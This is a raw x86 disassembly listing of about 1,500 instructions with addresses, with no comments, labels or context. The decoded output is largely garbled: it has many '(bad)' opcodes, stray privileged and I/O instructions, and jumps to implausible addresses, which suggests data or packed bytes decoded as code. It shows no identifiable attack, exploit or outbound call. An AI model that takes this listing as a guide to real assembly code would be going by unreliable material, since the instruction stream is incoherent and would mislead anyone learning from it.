  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
